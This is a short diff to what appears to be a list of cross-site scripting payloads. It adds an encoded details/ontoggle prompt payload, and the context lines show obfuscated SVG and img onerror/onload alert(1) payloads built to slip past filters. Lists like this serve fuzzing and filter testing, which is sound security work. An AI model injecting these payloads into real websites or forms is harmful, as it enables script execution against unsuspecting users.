@@ -1,3 +1,4 @@
+<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a()%20x>
 "%26%2339>alert(1)>%26%2339<Svg>
 XSS"<s><a+href=//%26lt;svg/o%26%2378;load=alert(1)%26gt;>
 1'"<S><A HRef=tel:/*%26apos;;/*%26quot;;/*%26lt;s%26gt;%26lt;Img/Src/*/O%26%2378;Error=alert(1)//%26gt; Title=tel:/*%26apos;;/*%26quot;;/*%26lt;s%26gt;%26lt;Img/Src/*/O%26%2378;Error=alert(1)//%26gt;>
